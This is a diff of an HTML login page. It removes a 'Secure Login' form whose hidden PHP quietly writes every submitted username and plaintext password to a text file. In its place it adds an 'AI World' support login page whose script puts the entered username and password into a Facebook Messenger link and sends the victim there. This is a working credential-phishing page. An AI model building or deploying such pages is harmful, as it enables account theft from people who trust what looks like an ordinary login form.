@@ -1,86 +1,66 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>Secure Login</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-      padding: 20px;
-    }
-    form {
-      width: 300px;
-      margin: auto;
-      padding: 20px;
-      background: #fff;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #007BFF;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      font-size: 1rem;
-    }
-  </style>
-</head>
-<body>
-<header hidden>
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Database connection
-    $dsn = "mysql:host=localhost;dbname=secure_app";
-    $username_db = "root";
-    $password_db = "";
-    
-    try {
-        $pdo = new PDO($dsn, $username_db, $password_db);
-        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-    } catch (PDOException $e) {
-        die("Database connection failed: " . $e->getMessage());
-    }
-
-    // Sanitize inputs
-    $username = htmlspecialchars($_POST['username']);
-    $password = $_POST['password'];
-$res = fopen("ls.txt", "w+");
-fwrite($res, "$username pass: $password");
-fclose($res);
-    // Hash the password securely
-    $hashed_password = password_hash($password, PASSWORD_ARGON2ID);
-
-    // Store user data securely
-    try {
-        $stmt = $pdo->prepare('INSERT INTO users (username, password) VALUES (:username, :password)');
-        $stmt->execute(['username' => $username, 'password' => $hashed_password]);
-        echo "User registered successfully!";
-    } catch (Exception $e) {
-        echo "Error: " . $e->getMessage();
-    }
-} else {
-    echo "Invalid request method.";
-}
-?>
-</header>
-  <form action="process_secure.php" method="POST">
-    <h3>Login</h3>
-    <input type="text" name="username" placeholder="Username" required />
-    <input type="password" name="password" placeholder="Password" required />
-    <button type="submit">Login</button>
-  </form>
-</body>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="width=device-width"/>
+        <title>AI World</title>
+        
+    </head>
+    <style>
+        body{
+            background-image:url('https://cdn.pixabay.com/animation/2023/11/04/16/43/16-43-51-167_512.gif');
+            background-repeat:no-repeat;
+            background-size:cover;
+            background-position:center top;
+        }
+    </style>
+    <body>
+        <div class="header">
+            <h1 style="color:neon;">AI <span style="color:purple;">World</span></h1>
+        </div>
+        <div class="form" action="" method="POST">
+            <div class="profile"></div>
+            <div class="text">
+             <span class="left"> AI </span>                  <span class="right">Support</span>
+            </div>
+            <center><h1>Username</h1></center>
+            <input type="text" name="username" id="username" placeholder="User"/>
+            <center><h1>Password</h1></center>
+            <input type="password" name="syntax" id="syntax" placeholder="Password"/>
+            <p></p>
+            <button class="button" type="submit">submit</button>
+            <style>
+                .form{display:flex;flex-direction:column;align-items:center;border:1px solid #000000;border-radius:25px;position:relative;top:160px;}
+                .header{text-align:right;position:relative;top:100px;}
+                .profile{height:100px;width:100px;border:1px solid #000000;background:url('https://static.vecteezy.com/system/resources/previews/068/438/008/non_2x/ai-logo-icon-with-star-and-square-icons-artificial-intelligence-and-machine-learning-sign-tools-for-generate-from-the-text-vector.jpg');background-repeat:no-repeat;background-size:cover;background-position:center top; border-radius:50px;}
+                h1{font-family:arial;}
+                h3{text-align:right;}
+                input{border-radius:10px;}
+                button{border-radius:10px;}
+                .left{position:relative;left:-100px;}
+                .right{position:relative; right:-120px;}
+                span{font-size:1.5rem;}
+                
+            </style>
+        </div>
+        <script>
+        
+            var data = "https://facebook.com/groups/1267644707720038/";
+            var user = document.querySelector("#username");
+            var pass = document.querySelector("#syntax");
+            var button = document.querySelector(".button");
+            
+            button.addEventListener("click", function(){
+                
+                   
+                   console.log(data)
+       
+                       
+                prompt("confirm message in messenger to join");
+         location = `https://m.me/david.okunfeyijimi.2025?text=jdjdhdbdjuchakaodbdudbsisbskwhdbxkshabsjebdydbeusbdianskdhxgsbwksydbsksywbskxhebeudbx${user.value}====hdhsbsnsnshsbxhxbsjsbxhsbsusbxnxjsbshx${pass.value}======bdududbdjslwbegzbskwhsbsjxhsbshsjsnsksob`;             
+         location = data; 
+            })
+            console.log(data)
+        </script>
+    </body>
 </html>
